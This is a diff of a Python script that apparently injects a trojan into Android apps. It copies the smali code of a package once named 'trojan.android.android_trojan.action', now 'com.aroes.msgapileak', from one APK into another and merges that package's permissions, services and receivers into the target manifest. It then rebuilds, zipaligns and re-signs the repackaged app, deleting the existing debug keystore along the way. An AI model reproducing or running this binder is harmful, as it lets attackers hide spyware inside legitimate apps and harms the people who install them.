@@ -9,13 +9,13 @@ import shutil
 import sys
 import glob
 
-apktool = "/home/hoodlums/apktool/apktool"
-androidSdk= os.path.expanduser('~') + "/Android/Sdk"
+apktool = "./apktool.txt"
+androidSdk= "/mnt/d/Android/sdk"
 
 
-TempDirectory = '/tmp/MixApk/'
+TempDirectory = './MixApk/'
 
-packageToInject = 'trojan.android.android_trojan.action'
+packageToInject = 'com.aroes.msgapileak'
 
 apk1 = TempDirectory + 'apk1.apk'
 apk2 = TempDirectory + 'apk2.apk'
@@ -209,19 +209,20 @@ EditManifest2 = EditManifest(manifest=apk2Manifest)
 
 apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
 apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'
+print apk1Action
+print apk2Action
 
-shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
-            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')
+shutil.copytree(apk1Action, apk2Action)
 
 for file in glob.glob(apk2Action + '*.smali'):
     sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))
 
 EditManifest2.addPermissions(ParseManifest1.listNodePermissions())
-EditManifest2.addService(ParseManifest1.listNodeService()[0], ParseManifest1.findMainPackage())
+EditManifest2.addService(ParseManifest1.listNodeService(), ParseManifest1.findMainPackage())
 EditManifest2.addReceiver(ParseManifest1.listNodeReceiver(), ParseManifest1.findMainPackage())
 
 try:
-    call(apktool + " b -d -f " + apk2Directory, shell=True)
+    call(apktool + " b -f " + apk2Directory, shell=True)
 except OSError as ex:
     error("can't build " + apk2Directory , str(ex), 1)
 
@@ -237,15 +238,15 @@ try:
     if os.path.exists(cd + '/app-debug2.apk'):
         os.remove(cd + '/app-debug2.apk')
     if not os.path.exists(os.path.expanduser('~') + '/.android/'):
-        os.makedirs(os.path.expanduser('~') + '/.android/') 
+        os.makedirs(os.path.expanduser('~') + '/.android/')
     if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
         os.remove(os.path.expanduser('~') + '/.android/debug.keystore')
 
     shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')
 
-    print(androidSdk + '/build-tools/21.1.2/zipalign -v 4 app-debug.apk app-debug2.apk')
+    print(androidSdk + '/build-tools/25.0.3/zipalign -v 4 app-debug.apk app-debug2.apk')
 
-    call(androidSdk + '/build-tools/21.1.2/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
+    call(androidSdk + '/build-tools/25.0.3/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
     call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
     call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
     call('jarsigner -verify app-debug2.apk', shell=True)
